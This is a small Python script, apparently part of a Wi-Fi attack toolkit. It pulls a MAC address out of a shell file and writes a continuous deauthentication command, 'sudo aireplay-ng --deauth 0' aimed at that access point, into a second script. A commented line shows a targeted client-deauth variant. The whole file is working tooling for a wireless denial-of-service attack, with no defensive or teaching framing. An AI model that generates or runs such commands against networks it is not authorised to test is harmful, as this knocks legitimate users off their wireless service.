import os 
path = f'{os.getcwd()}/wifi/pyscript/workspace/command-script/cmd.sh'
path2 = f'{os.getcwd()}/wifi/pyscript/workspace/command-script/cmd2.sh'
def take_input():
    with open(path, "r") as f:

        view = f.readlines() 
        view = list(view)
        view = str(view[2])
        lenght = len(view)
        mac = None
    
        for i in range(lenght) :
            if view[i] == '-':
                if view[i+1] == 'd':
                    mac = view[i+2:i+20]
                    break
               

            
    
    #aireplay-ng --deauth 100 -a {accesspoint_mac} -c {client_mac} -D wlan1      

    command = f"sudo aireplay-ng --deauth 0 -a {mac} wlan1"
    
    with open (path2,'w') as f:
        f.write(command)
        


    
take_input()

